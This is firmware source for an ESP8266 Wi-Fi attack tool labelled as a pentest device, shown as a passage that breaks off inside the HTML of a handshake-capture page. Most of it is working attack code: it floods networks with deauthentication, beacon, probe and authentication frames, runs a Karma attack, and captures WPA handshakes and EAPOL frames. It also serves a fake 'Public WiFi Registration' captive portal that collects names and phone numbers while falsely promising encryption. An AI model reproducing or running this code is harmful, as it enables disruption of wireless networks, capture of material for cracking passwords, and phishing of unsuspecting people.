#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

namespace Config {
  const int LED_PIN = 2;
  const char* AP_SSID = "TTAN_PenTest";
  const char* AP_PASSWORD = "pentester123";
  const int MAX_CREDENTIALS = 50;
  const int MAX_SCAN_RESULTS = 30;
  const int DEAUTH_INTERVAL = 50;        // Reduced for more effectiveness
  const int LED_BLINK_INTERVAL = 300;
  const int DNS_PORT = 53;
  const int WEB_PORT = 80;
  const int ADMIN_PORT = 8080;
  const int WATCHDOG_TIMEOUT = 100;
  const int MAX_STRING_LENGTH = 128;
  const int MAX_HANDSHAKES = 10;
  const int BEACON_INTERVAL = 50;        // Reduced for more effectiveness
  const int PROBE_INTERVAL = 30;         // Reduced for more effectiveness
  const int AUTH_INTERVAL = 20;           // Reduced for more effectiveness
  const int PMKID_TIMEOUT = 30000;       // Timeout for PMKID capture
}

struct HandshakeData {
  uint8_t bssid[6];
  uint8_t frames[4][256];
  uint16_t frameLengths[4];
  uint8_t frameCount;
  bool complete;
  unsigned long timestamp;
  
  HandshakeData() {
    memset(bssid, 0, 6);
    memset(frames, 0, sizeof(frames));
    memset(frameLengths, 0, sizeof(frameLengths));
    frameCount = 0;
    complete = false;
    timestamp = 0;
  }
};

struct SystemState {
  ESP8266WebServer* server;
  ESP8266WebServer* adminServer;
  DNSServer* dnsServer;
  bool dnsActive;
  
  bool deauthActive;
  bool pmkidActive;
  bool portalActive;
  bool snifferActive;
  bool handshakeActive;
  bool beaconFloodActive;
  bool probeFloodActive;
  bool authFloodActive;
  bool karmaActive;  // Karma attack (responds to probe requests)
  
  unsigned long totalRequests;
  unsigned long startTime;
  unsigned long deauthCount;
  unsigned long packetCount;
  unsigned long eapolCount;
  unsigned long handshakeCount;
  unsigned long beaconCount;
  unsigned long probeCount;
  unsigned long authCount;
  unsigned long karmaCount;
  int credentialCount;
  
  String scanData;
  String hostData;
  String deauthData;
  String pmkidData;
  String credentialData;
  String handshakeData;
  String beaconData;
  String probeData;
  String authData;
  String karmaData;
  String credentials[Config::MAX_CREDENTIALS];
  String currentPortalSSID;
  
  uint8_t targetBSSID[6];
  uint8_t broadcastMAC[6];
  int targetChannel;
  String targetSSID;
  
  unsigned long lastDeauth;
  unsigned long lastBlink;
  unsigned long lastWatchdog;
  unsigned long lastBeacon;
  unsigned long lastProbe;
  unsigned long lastAuth;
  unsigned long lastPMKIDCheck;
  
  int errorCount;
  String lastError;
  
  HandshakeData handshakes[Config::MAX_HANDSHAKES];
  
  SystemState() : 
    server(nullptr),
    adminServer(nullptr),
    dnsServer(nullptr),
    dnsActive(false),
    deauthActive(false),
    pmkidActive(false),
    portalActive(false),
    snifferActive(false),
    handshakeActive(false),
    beaconFloodActive(false),
    probeFloodActive(false),
    authFloodActive(false),
    karmaActive(false),
    totalRequests(0),
    startTime(0),
    deauthCount(0),
    packetCount(0),
    eapolCount(0),
    handshakeCount(0),
    beaconCount(0),
    probeCount(0),
    authCount(0),
    karmaCount(0),
    credentialCount(0),
    currentPortalSSID(""),
    targetChannel(1),
    lastDeauth(0),
    lastBlink(0),
    lastWatchdog(0),
    lastBeacon(0),
    lastProbe(0),
    lastAuth(0),
    lastPMKIDCheck(0),
    errorCount(0) {
    memset(targetBSSID, 0, 6);
    memset(broadcastMAC, 0xFF, 6);
  }
};

SystemState state;

namespace Packets {
  uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,                    
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,        
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,        
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       
    0x00, 0x00,                                 
    0x07, 0x00                                  
  };
  
  uint8_t beaconFrame[128] = {
    0x80, 0x00, 0x00, 0x00,                // Frame Control
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // BSSID (will be replaced)
    0x00, 0x00,                            // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (will be set)
    0x64, 0x00,                            // Beacon Interval
    0x31, 0x04,                            // Capability Info
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SSID Parameter Set (will be set)
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, // Supported Rates
    0x03, 0x01, 0x06,                      // DSSS Parameter Set
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00    // RSN Parameter Set
  };
  
  uint8_t probeRequestFrame[64] = {
    0x40, 0x00, 0x00, 0x00,                // Frame Control
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // BSSID
    0x00, 0x00,                            // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SSID Parameter Set (will be set)
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24  // Supported Rates
  };
  
  uint8_t probeResponseFrame[128] = {
    0x50, 0x00, 0x00, 0x00,                // Frame Control
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // BSSID (will be replaced)
    0x00, 0x00,                            // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (will be set)
    0x64, 0x00,                            // Beacon Interval
    0x31, 0x04,                            // Capability Info
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SSID Parameter Set (will be set)
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, // Supported Rates
    0x03, 0x01, 0x06,                      // DSSS Parameter Set
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00    // RSN Parameter Set
  };
  
  uint8_t authFrame[30] = {
    0xB0, 0x00, 0x00, 0x00,                // Frame Control
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // BSSID
    0x00, 0x00,                            // Sequence
    0x01, 0x00, 0x00, 0x00                 // Authentication Algorithm (Open System)
  };
  
  uint8_t assocReqFrame[64] = {
    0x00, 0x00, 0x00, 0x00,                // Frame Control
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // BSSID
    0x00, 0x00,                            // Sequence
    0x31, 0x04,                            // Capability Info
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Listen Interval
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // SSID Parameter Set (will be set)
  };
}

namespace Utils {
  void logError(const String& error) {
    state.errorCount++;
    state.lastError = error;
    Serial.println("ERROR: " + error);
  }
  
  String formatUptime(unsigned long ms) {
    unsigned long seconds = ms / 1000;
    unsigned long minutes = seconds / 60;
    unsigned long hours = minutes / 60;
    unsigned long days = hours / 24;
    
    if (days > 0) {
      return String(days) + "d " + String(hours % 24) + "h";
    } else if (hours > 0) {
      return String(hours) + "h " + String(minutes % 60) + "m";
    } else if (minutes > 0) {
      return String(minutes) + "m " + String(seconds % 60) + "s";
    }
    return String(seconds) + "s";
  }
  
  bool parseMACAddress(const String& mac, uint8_t* bssid) {
    if (mac.length() != 17) {
      logError("Invalid MAC length: " + String(mac.length()));
      return false;
    }
    
    int result = sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &bssid[0], &bssid[1], &bssid[2],
                       &bssid[3], &bssid[4], &bssid[5]);
    
    if (result != 6) {
      logError("MAC parse failed: " + mac);
      return false;
    }
    
    return true;
  }
  
  String macToString(const uint8_t* mac) {
    char buffer[18];
    snprintf(buffer, sizeof(buffer), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buffer);
  }
  
  String sanitizeString(const String& input) {
    if (input.length() == 0) return "";
    
    String output = "";
    int maxLen = min((int)input.length(), Config::MAX_STRING_LENGTH);
    
    for (int i = 0; i < maxLen; i++) {
      char c = input[i];
      if (isprint(c) && c != '<' && c != '>' && c != '&' && c != '"' && c != '\'') {
        output += c;
      }
    }
    return output;
  }
  
  bool isValidChannel(int channel) {
    return channel >= 1 && channel <= 13;
  }
  
  String encryptionTypeStr(uint8_t encType) {
    switch (encType) {
      case ENC_TYPE_NONE: return "OPEN";
      case ENC_TYPE_WEP: return "WEP";
      case ENC_TYPE_TKIP: return "WPA";
      case ENC_TYPE_CCMP: return "WPA2";
      case ENC_TYPE_AUTO: return "WPA/WPA2";
      default: return "UNKNOWN";
    }
  }
  
  void resetWatchdog() {
    ESP.wdtFeed();
    state.lastWatchdog = millis();
  }
  
  String formatBytes(size_t bytes) {
    if (bytes < 1024) {
      return String(bytes) + " B";
    } else if (bytes < (1024 * 1024)) {
      return String(bytes / 1024.0) + " KB";
    } else {
      return String(bytes / 1024.0 / 1024.0) + " MB";
    }
  }
  
  // Generate pseudo-random MAC address
  void generateRandomMAC(uint8_t* mac) {
    // Use system time as seed for pseudo-randomness
    unsigned long seed = millis();
    for (int i = 0; i < 6; i++) {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      mac[i] = (uint8_t)(seed >> 8);
    }
    // Set the locally administered bit
    mac[0] |= 0x02;
    // Clear the multicast bit
    mac[0] &= 0xFE;
  }
}

void ICACHE_RAM_ATTR snifferCallback(uint8_t* buf, uint16_t len) {
  if (len < 24) return;
  
  state.packetCount++;
  
  // Handle probe requests for Karma attack
  if (state.karmaActive && buf[0] == 0x40) {  // Probe Request
    uint8_t sourceMac[6];
    memcpy(sourceMac, &buf[10], 6);
    
    // Extract SSID from probe request
    int ssidLen = buf[25];
    if (ssidLen > 0 && ssidLen < 33) {
      char ssid[33];
      memcpy(ssid, &buf[26], ssidLen);
      ssid[ssidLen] = '\0';
      
      // Send probe response
      memcpy(&Packets::probeResponseFrame[10], state.targetBSSID, 6);
      memcpy(&Packets::probeResponseFrame[16], state.targetBSSID, 6);
      memcpy(&Packets::probeResponseFrame[4], sourceMac, 6);
      
      // Update timestamp
      uint32_t timestamp = millis();
      memcpy(&Packets::probeResponseFrame[24], &timestamp, 4);
      
      // Update SSID
      Packets::probeResponseFrame[38] = ssidLen;
      memcpy(&Packets::probeResponseFrame[39], ssid, ssidLen);
      
      // Calculate frame length
      uint16_t frameLen = 39 + ssidLen + 13;
      
      // Send probe response
      wifi_send_pkt_freedom(Packets::probeResponseFrame, frameLen, 0);
      state.karmaCount++;
    }
  }
  
  // PMKID and Handshake capture
  if ((state.pmkidActive || state.handshakeActive) && len > 100) {
    // Check for EAPOL frames
    if (buf[32] == 0x88 && buf[33] == 0x8E) {
      state.eapolCount++;
      
      uint8_t sourceMac[6];
      uint8_t bssid[6];
      memcpy(sourceMac, &buf[10], 6);
      memcpy(bssid, &buf[16], 6);
      
      if (state.pmkidActive) {
        state.pmkidData = "EAPOL #" + String(state.eapolCount) + " from " + 
                          Utils::macToString(sourceMac);
      }
      
      // Handshake capture
      if (state.handshakeActive) {
        // Find existing handshake data for this BSSID
        int handshakeIndex = -1;
        for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
          if (memcmp(state.handshakes[i].bssid, bssid, 6) == 0) {
            handshakeIndex = i;
            break;
          }
        }
        
        // Create new handshake entry if not found
        if (handshakeIndex == -1) {
          for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
            if (state.handshakes[i].frameCount == 0) {
              handshakeIndex = i;
              memcpy(state.handshakes[i].bssid, bssid, 6);
              state.handshakes[i].timestamp = millis();
              break;
            }
          }
        }
        
        // Store frame if we have space
        if (handshakeIndex != -1 && !state.handshakes[handshakeIndex].complete) {
          uint8_t frameNum = (buf[29] & 0x03);  // Extract frame number from Key Information
          
          if (frameNum >= 1 && frameNum <= 4 && state.handshakes[handshakeIndex].frameCount < 4) {
            // Check if we already have this frame
            bool haveFrame = false;
            for (int i = 0; i < state.handshakes[handshakeIndex].frameCount; i++) {
              uint8_t existingFrameNum = (state.handshakes[handshakeIndex].frames[i][29] & 0x03);
              if (existingFrameNum == frameNum) {
                haveFrame = true;
                break;
              }
            }
            
            if (!haveFrame) {
              // Store the frame
              uint16_t frameLen = min(len, (uint16_t)256);
              memcpy(state.handshakes[handshakeIndex].frames[state.handshakes[handshakeIndex].frameCount], 
                     buf, frameLen);
              state.handshakes[handshakeIndex].frameLengths[state.handshakes[handshakeIndex].frameCount] = frameLen;
              state.handshakes[handshakeIndex].frameCount++;
              
              // Check if handshake is complete
              if (state.handshakes[handshakeIndex].frameCount == 4) {
                state.handshakes[handshakeIndex].complete = true;
                state.handshakeCount++;
                state.handshakeData = "Complete handshake captured from " + 
                                     Utils::macToString(bssid) + " (" + 
                                     String(state.handshakeCount) + " total)";
              }
            }
          }
        }
      }
    }
  }
}

namespace Attacks {
  void sendDeauthPacket() {
    if (!state.deauthActive) return;
    
    memcpy(&Packets::deauthFrame[4], state.broadcastMAC, 6);
    memcpy(&Packets::deauthFrame[10], state.targetBSSID, 6);
    memcpy(&Packets::deauthFrame[16], state.targetBSSID, 6);
    
    int result = wifi_send_pkt_freedom(Packets::deauthFrame, sizeof(Packets::deauthFrame), 0);
    
    if (result == 0) {
      state.deauthCount++;
      
      if (state.deauthCount % 100 == 0) {
        state.deauthData = "Active - Sent: " + String(state.deauthCount) + " pkts | CH: " + 
                           String(state.targetChannel) + " | Target: " + state.targetSSID;
      }
    }
  }
  
  bool startDeauth(const String& mac, int channel, const String& ssid = "") {
    if (mac.length() == 0) {
      Utils::logError("Empty MAC address");
      return false;
    }
    
    if (!Utils::parseMACAddress(mac, state.targetBSSID)) {
      return false;
    }
    
    if (!Utils::isValidChannel(channel)) {
      Utils::logError("Invalid channel: " + String(channel));
      channel = 1;
    }
    
    state.targetChannel = channel;
    state.targetSSID = ssid.length() > 0 ? ssid : "Unknown";
    
    wifi_set_channel(state.targetChannel);
    
    state.deauthActive = true;
    state.deauthCount = 0;
    state.deauthData = "Started on CH " + String(state.targetChannel) + 
                       " | Target: " + state.targetSSID;
    
    Serial.println("DEAUTH START:");
    Serial.println("  MAC: " + mac);
    Serial.println("  SSID: " + state.targetSSID);
    Serial.println("  Channel: " + String(channel));
    
    return true;
  }
  
  void stopDeauth() {
    if (!state.deauthActive) return;
    
    state.deauthActive = false;
    state.deauthData = "Stopped - Total: " + String(state.deauthCount) + " pkts | " +
                       "Target: " + state.targetSSID;
    
    Serial.println("DEAUTH STOP - Total packets: " + String(state.deauthCount));
  }
  
  bool startPMKID(int channel) {
    if (!Utils::isValidChannel(channel)) {
      Utils::logError("Invalid channel for PMKID: " + String(channel));
      channel = 1;
    }
    
    state.targetChannel = channel;
    wifi_set_channel(state.targetChannel);
    
    wifi_set_promiscuous_rx_cb(snifferCallback);
    wifi_promiscuous_enable(1);
    
    state.pmkidActive = true;
    state.packetCount = 0;
    state.eapolCount = 0;
    state.lastPMKIDCheck = millis();
    state.pmkidData = "Listening on CH " + String(state.targetChannel) + " - Waiting for handshakes";
    
    Serial.println("PMKID START:");
    Serial.println("  Channel: " + String(channel));
    Serial.println("  Waiting for EAPOL frames...");
    
    return true;
  }
  
  void stopPMKID() {
    if (!state.pmkidActive) return;
    
    state.pmkidActive = false;
    wifi_promiscuous_enable(0);
    
    state.pmkidData = "Stopped - Packets: " + String(state.packetCount) + 
                      " | EAPOL: " + String(state.eapolCount);
    
    Serial.println("PMKID STOP:");
    Serial.println("  Total packets: " + String(state.packetCount));
    Serial.println("  EAPOL frames: " + String(state.eapolCount));
  }
  
  bool startHandshake(int channel) {
    if (!Utils::isValidChannel(channel)) {
      Utils::logError("Invalid channel for handshake capture: " + String(channel));
      channel = 1;
    }
    
    state.targetChannel = channel;
    wifi_set_channel(state.targetChannel);
    
    // Clear previous handshake data
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
      state.handshakes[i] = HandshakeData();
    }
    state.handshakeCount = 0;
    
    wifi_set_promiscuous_rx_cb(snifferCallback);
    wifi_promiscuous_enable(1);
    
    state.handshakeActive = true;
    state.packetCount = 0;
    state.eapolCount = 0;
    state.handshakeData = "Listening on CH " + String(state.targetChannel) + " - Waiting for WPA handshakes";
    
    Serial.println("HANDSHAKE CAPTURE START:");
    Serial.println("  Channel: " + String(channel));
    Serial.println("  Waiting for 4-way handshake...");
    
    return true;
  }
  
  void stopHandshake() {
    if (!state.handshakeActive) return;
    
    state.handshakeActive = false;
    wifi_promiscuous_enable(0);
    
    state.handshakeData = "Stopped - Packets: " + String(state.packetCount) + 
                          " | EAPOL: " + String(state.eapolCount) + 
                          " | Handshakes: " + String(state.handshakeCount);
    
    Serial.println("HANDSHAKE CAPTURE STOP:");
    Serial.println("  Total packets: " + String(state.packetCount));
    Serial.println("  EAPOL frames: " + String(state.eapolCount));
    Serial.println("  Complete handshakes: " + String(state.handshakeCount));
  }
  
  bool startSniffer(int channel) {
    if (!Utils::isValidChannel(channel)) {
      Utils::logError("Invalid channel for sniffer: " + String(channel));
      channel = 1;
    }
    
    state.targetChannel = channel;
    wifi_set_channel(state.targetChannel);
    
    wifi_set_promiscuous_rx_cb(snifferCallback);
    wifi_promiscuous_enable(1);
    
    state.snifferActive = true;
    state.packetCount = 0;
    
    Serial.println("SNIFFER START on channel " + String(channel));
    return true;
  }
  
  void stopSniffer() {
    if (!state.snifferActive) return;
    
    state.snifferActive = false;
    wifi_promiscuous_enable(0);
    
    Serial.println("SNIFFER STOP - Total packets: " + String(state.packetCount));
  }
  
  bool startPortal(String fakeSSID) {
    if (fakeSSID.length() == 0) {
      fakeSSID = "Free_WiFi";
    }
    fakeSSID = Utils::sanitizeString(fakeSSID);
    
    if (fakeSSID.length() == 0) {
      Utils::logError("Invalid SSID after sanitization");
      return false;
    }
    
    if (state.pmkidActive) stopPMKID();
    if (state.snifferActive) stopSniffer();
    if (state.handshakeActive) stopHandshake();
    
    WiFi.softAP(fakeSSID.c_str(), "");
    delay(100);
    
    if (state.dnsServer->start(Config::DNS_PORT, "*", WiFi.softAPIP())) {
      state.dnsActive = true;
      state.portalActive = true;
      state.credentialCount = 0;
      state.currentPortalSSID = fakeSSID;
      state.credentialData = "Active as: " + fakeSSID + " | Waiting for victims...";
      
      Serial.println("PORTAL START:");
      Serial.println("  Fake SSID: " + fakeSSID);
      Serial.println("  Portal IP: " + WiFi.softAPIP().toString());
      Serial.println("  Admin Panel: " + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT));
      
      return true;
    }
    
    Utils::logError("Failed to start DNS server");
    return false;
  }
  
  void stopPortal() {
    if (!state.portalActive) return;
    
    state.portalActive = false;
    state.dnsActive = false;
    state.dnsServer->stop();
    
    WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
    delay(100);
    
    state.credentialData = "Stopped - Captured: " + String(state.credentialCount) + " victim(s)";
    
    Serial.println("PORTAL STOP:");
    Serial.println("  Victims captured: " + String(state.credentialCount));
  }
  
  bool startBeaconFlood(int channel, const String& ssid = "") {
    if (!Utils::isValidChannel(channel)) {
      Utils::logError("Invalid channel for beacon flood: " + String(channel));
      channel = 1;
    }
    
    state.targetChannel = channel;
    wifi_set_channel(state.targetChannel);
    
    state.beaconFloodActive = true;
    state.beaconCount = 0;
    state.targetSSID = ssid.length() > 0 ? ssid : "FakeAP";
    
    // Set random source MAC for beacon frames
    Utils::generateRandomMAC(state.targetBSSID);
    
    state.beaconData = "Started on CH " + String(state.targetChannel) + " | SSID: " + state.targetSSID;
    
    Serial.println("BEACON FLOOD START:");
    Serial.println("  Channel: " + String(channel));
    Serial.println("  SSID: " + state.targetSSID);
    
    return true;
  }
  
  void stopBeaconFlood() {
    if (!state.beaconFloodActive) return;
    
    state.beaconFloodActive = false;
    state.beaconData = "Stopped - Total beacons: " + String(state.beaconCount);
    
    Serial.println("BEACON FLOOD STOP - Total beacons: " + String(state.beaconCount));
  }
  
  void sendBeaconPacket() {
    if (!state.beaconFloodActive) return;
    
    // Update timestamp
    uint32_t timestamp = millis();
    memcpy(&Packets::beaconFrame[24], &timestamp, 4);
    
    // Update SSID
    uint8_t ssidLen = state.targetSSID.length();
    Packets::beaconFrame[38] = ssidLen;
    memcpy(&Packets::beaconFrame[39], state.targetSSID.c_str(), ssidLen);
    
    // Update BSSID and source MAC
    memcpy(&Packets::beaconFrame[10], state.targetBSSID, 6);
    memcpy(&Packets::beaconFrame[16], state.targetBSSID, 6);
    
    // Calculate frame length
    uint16_t frameLen = 39 + ssidLen + 13;  // Base length + SSID + fixed parameters
    
    // Send packet
    int result = wifi_send_pkt_freedom(Packets::beaconFrame, frameLen, 0);
    
    if (result == 0) {
      state.beaconCount++;
      
      if (state.beaconCount % 50 == 0) {
        state.beaconData = "Active - Sent: " + String(state.beaconCount) + " beacons | CH: " + 
                           String(state.targetChannel) + " | SSID: " + state.targetSSID;
      }
    }
  }
  
  bool startProbeFlood(int channel, const String& ssid = "") {
    if (!Utils::isValidChannel(channel)) {
      Utils::logError("Invalid channel for probe flood: " + String(channel));
      channel = 1;
    }
    
    state.targetChannel = channel;
    wifi_set_channel(state.targetChannel);
    
    state.probeFloodActive = true;
    state.probeCount = 0;
    state.targetSSID = ssid.length() > 0 ? ssid : "TargetNetwork";
    
    // Set random source MAC for probe frames
    Utils::generateRandomMAC(state.targetBSSID);
    
    state.probeData = "Started on CH " + String(state.targetChannel) + " | SSID: " + state.targetSSID;
    
    Serial.println("PROBE FLOOD START:");
    Serial.println("  Channel: " + String(channel));
    Serial.println("  SSID: " + state.targetSSID);
    
    return true;
  }
  
  void stopProbeFlood() {
    if (!state.probeFloodActive) return;
    
    state.probeFloodActive = false;
    state.probeData = "Stopped - Total probes: " + String(state.probeCount);
    
    Serial.println("PROBE FLOOD STOP - Total probes: " + String(state.probeCount));
  }
  
  void sendProbePacket() {
    if (!state.probeFloodActive) return;
    
    // Update SSID
    uint8_t ssidLen = state.targetSSID.length();
    Packets::probeRequestFrame[24] = ssidLen;
    memcpy(&Packets::probeRequestFrame[25], state.targetSSID.c_str(), ssidLen);
    
    // Update source MAC
    memcpy(&Packets::probeRequestFrame[10], state.targetBSSID, 6);
    
    // Calculate frame length
    uint16_t frameLen = 25 + ssidLen + 10;  // Base length + SSID + supported rates
    
    // Send packet
    int result = wifi_send_pkt_freedom(Packets::probeRequestFrame, frameLen, 0);
    
    if (result == 0) {
      state.probeCount++;
      
      if (state.probeCount % 50 == 0) {
        state.probeData = "Active - Sent: " + String(state.probeCount) + " probes | CH: " + 
                          String(state.targetChannel) + " | SSID: " + state.targetSSID;
      }
    }
  }
  
  bool startAuthFlood(const String& mac, int channel) {
    if (mac.length() == 0) {
      Utils::logError("Empty MAC address for auth flood");
      return false;
    }
    
    if (!Utils::parseMACAddress(mac, state.targetBSSID)) {
      return false;
    }
    
    if (!Utils::isValidChannel(channel)) {
      Utils::logError("Invalid channel for auth flood: " + String(channel));
      channel = 1;
    }
    
    state.targetChannel = channel;
    wifi_set_channel(state.targetChannel);
    
    state.authFloodActive = true;
    state.authCount = 0;
    
    // Set random source MAC for auth frames
    Utils::generateRandomMAC(state.targetBSSID);
    
    state.authData = "Started on CH " + String(state.targetChannel) + " | Target: " + mac;
    
    Serial.println("AUTH FLOOD START:");
    Serial.println("  Channel: " + String(channel));
    Serial.println("  Target: " + mac);
    
    return true;
  }
  
  void stopAuthFlood() {
    if (!state.authFloodActive) return;
    
    state.authFloodActive = false;
    state.authData = "Stopped - Total auths: " + String(state.authCount);
    
    Serial.println("AUTH FLOOD STOP - Total auths: " + String(state.authCount));
  }
  
  void sendAuthPacket() {
    if (!state.authFloodActive) return;
    
    // Update source MAC with random value
    Utils::generateRandomMAC(&Packets::authFrame[10]);
    
    // Send packet
    int result = wifi_send_pkt_freedom(Packets::authFrame, sizeof(Packets::authFrame), 0);
    
    if (result == 0) {
      state.authCount++;
      
      if (state.authCount % 50 == 0) {
        state.authData = "Active - Sent: " + String(state.authCount) + " auths | CH: " + 
                         String(state.targetChannel);
      }
    }
  }
  
  bool startKarma(const String& ssid = "") {
    if (ssid.length() == 0) {
      Utils::logError("Empty SSID for Karma attack");
      return false;
    }
    
    state.targetSSID = ssid;
    state.karmaActive = true;
    state.karmaCount = 0;
    
    // Set BSSID for Karma attack
    Utils::generateRandomMAC(state.targetBSSID);
    
    // Start promiscuous mode to capture probe requests
    wifi_set_promiscuous_rx_cb(snifferCallback);
    wifi_promiscuous_enable(1);
    
    state.karmaData = "Started - Responding to probes for: " + state.targetSSID;
    
    Serial.println("KARMA ATTACK START:");
    Serial.println("  Responding to probes for: " + state.targetSSID);
    
    return true;
  }
  
  void stopKarma() {
    if (!state.karmaActive) return;
    
    state.karmaActive = false;
    wifi_promiscuous_enable(0);
    
    state.karmaData = "Stopped - Total responses: " + String(state.karmaCount);
    
    Serial.println("KARMA ATTACK STOP - Total responses: " + String(state.karmaCount));
  }
  
  void stopAllAttacks() {
    if (state.deauthActive) stopDeauth();
    if (state.pmkidActive) stopPMKID();
    if (state.handshakeActive) stopHandshake();
    if (state.portalActive) stopPortal();
    if (state.snifferActive) stopSniffer();
    if (state.beaconFloodActive) stopBeaconFlood();
    if (state.probeFloodActive) stopProbeFlood();
    if (state.authFloodActive) stopAuthFlood();
    if (state.karmaActive) stopKarma();
    
    Serial.println("All attacks stopped");
  }
}

namespace HTML {
  String getCaptivePortal() {
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    html += "<meta charset='UTF-8'>";
    html += "<title>Public WiFi Registration</title><style>";
    html += "body{margin:0;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;";
    html += "background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}";
    html += ".container{background:#fff;padding:40px;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:400px;width:100%}";
    html += "h2{margin:0 0 10px;color:#333;text-align:center;font-size:24px}";
    html += ".subtitle{text-align:center;color:#666;margin-bottom:30px;font-size:14px}";
    html += "input{width:100%;padding:14px;margin:12px 0;border:2px solid #e0e0e0;border-radius:8px;box-sizing:border-box;font-size:15px;transition:border 0.3s}";
    html += "input:focus{border-color:#667eea;outline:none}";
    html += "button{width:100%;padding:16px;background:#667eea;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.3s}";
    html += "button:hover{background:#5568d3}";
    html += ".info{margin-top:20px;text-align:center;color:#888;font-size:12px}";
    html += ".logo{text-align:center;margin-bottom:20px;font-size:48px}";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<div class='logo'>📱</div>";
    html += "<h2>Public WiFi Registration</h2>";
    html += "<div class='subtitle'>Enter your details to access to network</div>";
    html += "<form method='POST' action='/submit'>";
    html += "<input name='name' placeholder='Full Name' required autocomplete='off' maxlength='32'>";
    html += "<input name='mobile' type='tel' placeholder='Mobile Number' required autocomplete='off' maxlength='15' pattern='[0-9]{10,15}'>";
    html += "<button type='submit'>Connect to Network</button>";
    html += "</form>";
    html += "<div class='info'>🔒 Your information is encrypted and secure</div>";
    html += "</div></body></html>";
    return html;
  }
  
  String getSuccessPage() {
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
    html += "body{font-family:Arial;background:#667eea;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}";
    html += ".box{background:#fff;padding:50px;border-radius:12px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.2)}";
    html += "h2{color:#2ecc71;margin:0 0 15px;font-size:28px}";
    html += "p{color:#666;margin:0;font-size:16px}";
    html += ".check{font-size:60px;color:#2ecc71;margin-bottom:20px}";
    html += "</style></head><body><div class='box'>";
    html += "<div class='check'>✓</div>";
    html += "<h2>Registration Successful</h2>";
    html += "<p>Your device is now connected to the network</p>";
    html += "</div></body></html>";
    return html;
  }
  
  String getHandshakePage() {
    String page = "<!DOCTYPE html><html><head>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta charset='UTF-8'>";
    page += "<title>Handshake Capture</title><style>";
    page += "body{font-family:'Courier New',monospace;background:#0a0e27;color:#0f0;padding:20px;margin:0}";
    page += ".wrap{max-width:1000px;margin:0 auto}";
    page += "h1{color:#0f0;text-shadow:0 0 10px #0f0;text-align:center;font-size:2em;border-bottom:2px solid #0f0;padding-bottom:10px}";
    page += ".info{background:#0f1419;padding:15px;border:2px solid #0f0;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(0,255,0,0.3)}";
    page += ".handshake{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #0f0;box-shadow:0 0 15px rgba(0,255,0,0.2);word-wrap:break-word}";
    page += ".count{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}";
    page += ".time{color:#0ff;font-size:0.85em}";
